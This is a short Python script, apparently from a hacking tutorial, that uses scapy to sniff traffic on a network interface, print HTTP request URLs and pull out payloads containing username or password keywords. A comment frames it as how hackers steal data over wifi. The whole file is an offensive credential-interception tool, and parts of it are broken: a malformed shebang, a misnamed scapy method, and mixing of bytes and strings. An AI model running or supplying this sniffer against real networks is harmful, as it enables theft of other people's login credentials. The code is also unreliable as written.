# First Add the Shebang / Creating a Packet Sniffer (A tool for sniffing packets over a network)
# This is how hackers Steal data over wifi networks
# ! usr/bin/env Python


import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayers(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "password", "Pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayers(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request >>" + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] passible Username/Password > " + login_info + "\n\n")


# interface name!

sniff("eth0")
